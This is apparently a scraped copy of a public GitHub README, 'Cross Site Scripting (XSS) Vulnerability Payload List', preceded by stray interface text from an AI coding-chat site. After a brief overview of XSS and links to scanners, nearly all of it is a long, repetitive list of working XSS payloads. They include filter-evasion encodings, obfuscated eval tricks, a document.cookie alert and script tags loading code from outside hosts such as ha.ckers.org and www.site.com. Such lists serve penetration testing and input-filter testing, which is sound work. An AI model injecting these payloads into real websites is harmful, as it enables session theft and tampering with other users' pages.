

Settings

Hi! Here some our recommendations to get the best out of BLACKBOX:

Be as clear as possible

End the question in what language you want the answer to be, e.g: ‘connect to mongodb in python
or you can just
Go to Blackbox
Here are some suggestion (choose one):
Write a function that reads data from a json file
How to delete docs from mongodb in phyton
Connect to mongodb in nodejs
Ask any coding question
send
refresh
Blackbox AI Chat is in beta and Blackbox is not liable for the content generated. By using Blackbox, you acknowledge that you agree to agree to Blackbox's Terms and Privacy Policy
### 🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀

<img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/xss-payload-list/1">

##### Overview : 

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).

#### XSS Vulnerability Scanner Tool's :

* [XSStrike](https://github.com/UltimateHackers/XSStrike)

* [BruteXSS Terminal](https://github.com/shawarkhanethicalhacker/BruteXSS)

* [BruteXSS GUI](https://github.com/rajeshmajumdar/BruteXSS)

* [XSS Scanner Online](http://xss-scanner.com/)

* [XSSer](https://tools.kali.org/web-applications/xsser)

* [xsscrapy](https://github.com/DanMcInerney/xsscrapy)  
* [Cyclops](https://github.com/v8blink/Chromium-based-XSS-Taint-Tracking)  

#### XSS Payload List :

```
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Ismail Tasdelen -->
<!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
<!--        GitHub : https://github.com/ismailtasdelen/ -->
<!--       Twitter : https://twitter.com/ismailtsdln -->
<!--        Medium : https://medium.com/@ismailtasdelen -->

<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC="jav   ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<IMG SRC="javascript:alert('XSS')"
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt    p://6   6.000146.0x7.147/">XSS</A>
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
<IMG SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(‘XSS’)>      
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
<IMG SRC=”jav ascript:alert(‘XSS’);”>
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
<<SCRIPT>alert(“XSS”);//<</SCRIPT>
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
<BODY ONLOAD=alert(‘XSS’)>
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=”javascript:alert(‘XSS’)”
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<script>alert("XSS");</script>&search=1
<input onfocus=write(XSS) autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form><button formaction="javascript:alert(XSS)">lol
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
\\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
d=\"alert('XSS');\\")\";
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
'';!--\"&lt;XSS&gt;=&{()}
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<BODY ONLOAD=alert(’XSS’)>
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC="jav   ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<IMG SRC="javascript:alert('XSS')"
\";alert('XSS');//
</script><script>alert('XSS');</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<A HREF="http://66.102.7.147/">XSS</A>
veris-->group<svg/onload=alert(/XSS/)//
#"><img src=M onerror=alert('XSS');>
element[attribute='<img src=x onerror=alert('XSS');>
alert;pg("XSS")
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<INPUT TYPE="BUTTON" action="alert('XSS')"/>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<IMG SRC="javascript:alert('XSS')"
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
'';!--"<XSS>=&{()}
'); alert('XSS
<script>alert('XSS');</script>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<marquee><script>alert('XSS')</script></marquee>
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<IMG LOWSRC=\"javascript:alert('XSS')\">
<IMG DYNSRC=\"javascript:alert('XSS')\">
<img src="javascript:alert('XSS')">
<script language="JavaScript">alert('XSS')</script>
<body onunload="javascript:alert('XSS');">
<body onLoad="alert('XSS');"
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
'>><marquee><h1>XSS</h1></marquee>
'">><script>alert('XSS')</script>
'">><marquee><h1>XSS</h1></marquee>
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
<br size=\"&{alert('XSS')}\">
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<BASE HREF="javascript:alert('XSS');//">
<body onLoad="while(true) alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
'>"><script src = 'http://www.site.com/XSS.js'></script>
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SCRIPT>document.write("XSS");</SCRIPT>
">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
src="http://www.site.com/XSS.js"></script>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
